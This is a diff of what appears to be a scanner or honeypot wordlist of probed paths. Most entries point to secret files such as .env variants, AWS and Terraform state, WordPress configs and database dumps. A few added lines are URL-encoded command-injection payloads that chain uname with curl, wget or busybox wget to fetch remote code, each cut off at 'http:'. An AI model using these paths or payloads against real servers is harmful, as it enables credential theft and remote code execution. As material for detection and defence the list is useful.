@@ -19,8 +19,8 @@ admin
 phpinfo
 .aws
 .env.php
-config.json
 SDK
+config.json
 webLanguage
 _profiler
 web
@@ -60,9 +60,9 @@ tests
 .svn
 default
 .env.prod
+cgi-bin
 debug
 phpinfo.php
-cgi-bin
 .env.local.php
 config.php
 var
@@ -70,10 +70,10 @@ HEAD
 beta
 sendgrid
 cms
+robots.txt
 apps
 config.js
 log
-robots.txt
 tmp
 .env.test
 crm
@@ -114,6 +114,7 @@ terraform.tfstate
 .env.testing
 examples
 index.html
+system
 aws.yml
 dashboard
 media
@@ -124,17 +125,18 @@ data
 get
 ip.cypher.rest:443
 portal
-system
 application
 application.yml
 home
 static
 main
+bin
 debug.log
 .claude
 application.properties
 error.log
 htdocs
+local
 shop
 sql
 uploads
@@ -143,7 +145,6 @@ appsettings.json
 database.sql
 docs
 dump.sql
-local
 site.zip
 test.php
 db.sql
@@ -169,7 +170,6 @@ sendgrid.env
 service
 .env.json
 aws
-bin
 open
 sh
 wp-content
@@ -250,10 +250,10 @@ js
 developmentserver
 metadatauploader
 mysql
+*
 .env_sample
 .github
 sftp.json
-*
 login.html
 panel
 shared
@@ -280,6 +280,7 @@ workflows
 $(pwd)
 .env.ci
 .npmrc
+HNAP1
 config.py
 drupal
 health
@@ -291,7 +292,6 @@ wp-admin
 %00.env
 .env.sample
 .env.secret
-HNAP1
 LICENSE
 owa
 workspace
@@ -395,7 +395,9 @@ service-account.json
 wp-config.php.orig
 %2eenv
 .travis.yml
+127.0.0.1:8099
 azure
+b
 backup.tar.gz
 code
 css
@@ -742,6 +744,8 @@ wp-config.old
 wp-config.php.dist
 wp-config.php.gz
 wp-config.txt
+$%28uname$%7BIFS%7D-n%29%7C%7Ccurl$%7BIFS%7D-fsSL$%7BIFS%7D-m$%7BIFS%7D4$%7BIFS%7Dhttp:
+$%28uname$%7BIFS%7D-n%29%7C%7Cwget$%7BIFS%7D-qO-$%7BIFS%7D-T$%7BIFS%7D4$%7BIFS%7Dhttp:
 %2F.env
 .
 .amazonq
@@ -809,10 +813,12 @@ backup.tar
 base_dir
 basic-network
 bgoldd
+bin:
 blankon
 blob
 blue
 bucoffea
+busybox$%7BIFS%7Dwget$%7BIFS%7D-qO-$%7BIFS%7D-T$%7BIFS%7D4$%7BIFS%7Dhttp:
 cdw-backend
 cert.pem
 ch6-mytodo
@@ -980,6 +986,8 @@ xmlrpc.php
 .vercel
 .vs
 09-production
+127.0.0.1
+127.0.0.1:23413
 1phpmyadmin
 2phpmyadmin
 <invalid>hello.html
@@ -1014,6 +1022,7 @@ _phpMyAdmin
 _phpinfo.php
 _phpmyadmin
 _phpmyadmin_
+a56f1a4933ad0bca
 adminpanel
 ads.txt
 agora
@@ -1088,6 +1097,7 @@ docker-elk
 dot_env
 dotfiles
 dump
+e
 e2e
 ec2-user
 en-GB
@@ -1097,6 +1107,7 @@ env.bak
 expected
 export.sql
 ext-js
+f
 fastlane
 favicon.png
 favicons
@@ -1129,6 +1140,7 @@ inventory.ini
 items
 jenkins
 js-plugin
+k
 keys
 kitchensink
 kubeconfig
@@ -1155,6 +1167,7 @@ my_env
 mysql-admin
 mysql.php
 mysqladmin
+n
 name
 nbproject
 new-js
@@ -1219,6 +1232,7 @@ prod-env
 program
 properties
 proxy
+r
 rabbitmq
 registry
 results
@@ -1266,6 +1280,7 @@ todo-react
 typeScriptProject
 typeScriptVisualizeProject
 urlmem-app
+usr
 utils
 v11.0
 vault.yml
@@ -1502,6 +1517,7 @@ bedrock-credentials.yml
 bookchain-client
 bookmarkable
 build.yml
+busybox$%7BIFS%7Dwget$%7BIFS%7D-qO.y$%7BIFS%7Dhttp:
 c
 cdn-cgi
 cgi
@@ -1610,6 +1626,7 @@ gitlab-ci
 global-protect
 global.asax
 gobuffalo
+goform
 google-ai.yml
 gotenv
 graphiql
@@ -1617,6 +1634,7 @@ graylog
 grems-api
 group_vars
 gui
+handler
 hc
 header_logo.cgi
 health-check
@@ -1811,8 +1829,11 @@ roundcubemail
 ruby
 runtime
 runtime-config.js
+s%7C%7Ccurl$%7BIFS%7D-fsSL$%7BIFS%7D-m$%7BIFS%7D8$%7BIFS%7D-o.y$%7BIFS%7Dhttp:
+s%7C%7Cwget$%7BIFS%7D-qO.y$%7BIFS%7Dhttp:
 s3.js
 sample01
+sbin:
 secret.env
 secret.yaml
 selfish-darling-backend
@@ -1925,4 +1946,5 @@ wp_filemanager.php
 wrangler.toml
 www-data
 zmusic-frontend
+ztp
 zxtm
